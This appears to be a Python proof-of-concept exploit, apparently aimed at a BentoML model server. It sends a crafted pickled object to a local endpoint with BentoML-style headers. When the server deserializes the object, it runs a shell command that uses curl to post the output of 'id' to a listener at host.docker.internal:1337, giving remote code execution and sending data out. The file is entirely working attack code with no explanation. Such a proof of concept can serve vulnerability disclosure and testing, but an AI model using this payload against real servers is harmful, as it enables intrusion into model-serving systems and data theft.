import requests
import pickle

url = "http://0.0.0.0:3000/"

headers = {
    "args-number": "1",
    "Content-Type": "application/vnd.bentoml.pickled",
    "Payload-Container": "NdarrayContainer",
    "Payload-Meta": '{"format": "default"}',
    "Batch-Size": "-1",
}


class P:
    def __reduce__(self):
        return (
            __import__("os").system,
            ('curl -X POST -d "$(id)" http://host.docker.internal:1337',),
        )


response = requests.post(url, headers=headers, data=pickle.dumps(P()))

print(response)
